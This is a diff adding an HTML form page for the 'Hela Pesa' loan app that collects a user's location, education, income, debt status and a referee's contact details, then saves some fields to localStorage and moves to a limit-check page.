@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Hela Pesa - More Details</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="bg-white text-gray-800 font-sans">
+
+  <!-- Header -->
+  <div class="p-4 text-center shadow-md">
+    <img src="zashlogo.png" alt="Hela Pesa" class="w-12 mx-auto mb-2">
+    <h1 class="text-xl font-semibold">Additional information</h1>
+    <p class="text-gray-600">Help us know you better</p>
+  </div>
+
+  <!-- Form -->
+  <div class="p-6 max-w-md mx-auto mt-4 space-y-4" id="form">
+    <div>
+      <label class="block font-medium" for="county">County</label>
+      <select id="county"
+        class="w-full border border-gray-300 px-4 py-2 rounded focus:outline-none focus:ring-2 focus:ring-red-400">
+        <option disabled selected>Select County</option>
+        <option>Baringo</option>
+        <option>Bomet</option>
+        <option>Bungoma</option>
+        <option>Busia</option>
+        <option>Elgeyo-Marakwet</option>
+        <option>Embu</option>
+        <option>Garissa</option>
+        <option>Homa Bay</option>
+        <option>Isiolo</option>
+        <option>Kajiado</option>
+        <option>Kakamega</option>
+        <option>Kericho</option>
+        <option>Kiambu</option>
+        <option>Kilifi</option>
+        <option>Kirinyaga</option>
+        <option>Kisii</option>
+        <option>Kisumu</option>
+        <option>Kitui</option>
+        <option>Kwale</option>
+        <option>Laikipia</option>
+        <option>Lamu</option>
+        <option>Machakos</option>
+        <option>Makueni</option>
+        <option>Mandera</option>
+        <option>Marsabit</option>
+        <option>Meru</option>
+        <option>Migori</option>
+        <option>Mombasa</option>
+        <option>Murang'a</option>
+        <option>Nairobi</option>
+        <option>Nakuru</option>
+        <option>Nandi</option>
+        <option>Narok</option>
+        <option>Nyamira</option>
+        <option>Nyandarua</option>
+        <option>Nyeri</option>
+        <option>Samburu</option>
+        <option>Siaya</option>
+        <option>Taita-Taveta</option>
+        <option>Tana River</option>
+        <option>Tharaka-Nithi</option>
+        <option>Trans Nzoia</option>
+        <option>Turkana</option>
+        <option>Uasin Gishu</option>
+        <option>Vihiga</option>
+        <option>Wajir</option>
+        <option>West Pokot</option>
+      </select>
+    </div>
+
+    <div>
+      <label class="block font-medium">Town</label>
+      <input type="text" id="town" placeholder="Enter town"
+        class="w-full border border-gray-300 px-4 py-2 rounded focus:outline-none focus:ring-2 focus:ring-red-400" />
+    </div>
+
+    <div>
+      <label class="block font-medium" for="education">Education</label>
+      <select id="education"
+        class="w-full border border-gray-300 px-4 py-2 rounded focus:outline-none focus:ring-2 focus:ring-red-400">
+        <option disabled selected>Select education level</option>
+        <option>Primary</option>
+        <option>Secondary</option>
+        <option>Diploma</option>
+        <option>Degree</option>
+        <option>Masters</option>
+        <option>PhD</option>
+        <option>Other</option>
+      </select>
+    </div>
+
+    <div>
+      <label class="block font-medium" for="employment">Employment Type</label>
+      <select id="employment"
+        class="w-full border border-gray-300 px-4 py-2 rounded focus:outline-none focus:ring-2 focus:ring-red-400">
+        <option disabled selected>Select employment type</option>
+        <option>Employed</option>
+        <option>Self-employed</option>
+        <option>Unemployed</option>
+        <option>Student</option>
+        <option>Other</option>
+      </select>
+    </div>
+
+    <div>
+      <label class="block font-medium">Monthly Income</label>
+      <input type="number" id="income" placeholder="Enter monthly income"
+        class="w-full border border-gray-300 px-4 py-2 rounded focus:outline-none focus:ring-2 focus:ring-red-400" />
+    </div>
+
+    <!-- Questionnaire -->
+    <div class="pt-4 border-t border-gray-200">
+      <p class="font-medium mb-2">Additional Information</p>
+
+      <div class="space-y-3">
+        <div>
+          <p>Do you have children under 18?</p>
+          <div class="flex gap-4 mt-1">
+            <label><input type="radio" name="children" value="Yes"> Yes</label>
+            <label><input type="radio" name="children" value="No"> No</label>
+          </div>
+        </div>
+
+        <div>
+          <p>Do you currently have outstanding debt?</p>
+          <div class="flex gap-4 mt-1">
+            <label><input type="radio" name="debt" value="Yes"> Yes</label>
+            <label><input type="radio" name="debt" value="No"> No</label>
+          </div>
+        </div>
+
+        <div>
+          <p>Do you have an active loan?</p>
+          <div class="flex gap-4 mt-1">
+            <label><input type="radio" name="loan" value="Yes"> Yes</label>
+            <label><input type="radio" name="loan" value="No"> No</label>
+          </div>
+        </div>
+
+        <div>
+          <p>Do you agree to be contacted before the loan due date?</p>
+          <div class="flex gap-4 mt-1">
+            <label><input type="radio" name="contact" value="Yes"> Yes</label>
+            <label><input type="radio" name="contact" value="No"> No</label>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Referee Contact -->
+    <div class="pt-6 border-t border-gray-200">
+      <p class="text-sm text-gray-600 mb-2">
+        To ensure faster credit processing, enter your contact person on information below. Should be 18–60 years old
+      </p>
+
+      <div class="mb-3">
+        <label class="block font-medium">Referee Full Name</label>
+        <input type="text" id="refereeName" placeholder="Enter referee name"
+          class="w-full border border-gray-300 px-4 py-2 rounded focus:outline-none focus:ring-2 focus:ring-red-400" />
+      </div>
+
+      <div class="mb-3">
+        <label class="block font-medium">Referee Phone Number</label>
+        <input type="tel" id="refereePhone" placeholder="07XXXXXXXX"
+          class="w-full border border-gray-300 px-4 py-2 rounded focus:outline-none focus:ring-2 focus:ring-red-400" />
+      </div>
+
+      <div>
+        <label class="block font-medium" for="refereeRelation">Relationship to Referee</label>
+        <select id="refereeRelation"
+          class="w-full border border-gray-300 px-4 py-2 rounded focus:outline-none focus:ring-2 focus:ring-red-400">
+          <option disabled selected>Select relationship</option>
+          <option>Parent</option>
+          <option>Sibling</option>
+          <option>Friend</option>
+          <option>Spouse</option>
+          <option>Cousin</option>
+          <option>Colleague</option>
+          <option>Neighbor</option>
+          <option>Guardian</option>
+          <option>Other</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Continue Button -->
+    <button onclick="saveOtherDetails()" class="w-full bg-red-500 text-white py-2 mt-6 rounded hover:bg-red-600">
+      Continue
+    </button>
+  </div>
+
+  <!-- Footer -->
+  <div class="bg-red-100 text-gray-800 p-4 mt-10 text-sm">
+    <div class="max-w-md mx-auto">
+      <p class="mb-2"><strong>Support service:</strong> 0701-201-0001 (Mon–Sun: 8AM–6PM)</p>
+      <p class="mb-2"><strong>Email:</strong> support@helapesa.co.ke</p>
+      <p><strong>Application acceptance:</strong> 24/7</p>
+      <div class="mt-4 flex gap-4 justify-center text-lg text-red-600">
+        <i class="fab fa-facebook"></i>
+        <i class="fab fa-instagram"></i>
+        <i class="fab fa-linkedin"></i>
+      </div>
+    </div>
+  </div>
+
+  <!-- Local Storage Script -->
+  <script>
+    async function saveOtherDetails() {
+      try {
+        const data = {
+          county: document.getElementById("county")?.value || "",
+          education: document.getElementById("education")?.value || "",
+          employment: document.getElementById("employment")?.value || "",
+          employer: document.getElementById("employer")?.value?.trim() || "",
+          income: document.getElementById("income")?.value?.trim() || "",
+          refereeName: document.getElementById("refereeName")?.value?.trim() || "",
+          refereePhone: document.getElementById("refereePhone")?.value?.trim() || "",
+          refereeRelation: document.getElementById("refereeRelation")?.value || "",
+          step: 'other_details',
+          createdAt: new Date().toISOString()
+        };
+
+        // Store other details to localStorage
+        localStorage.setItem("otherDetails", JSON.stringify(data));
+
+        // Go to next step
+        window.location.href = "checklimit.html";
+      } catch (error) {
+        console.error("Error saving other details:", error);
+        alert("There was an error saving your information. Please try again.");
+      }
+    }
+  </script>
+
+</body>
+
+</html>
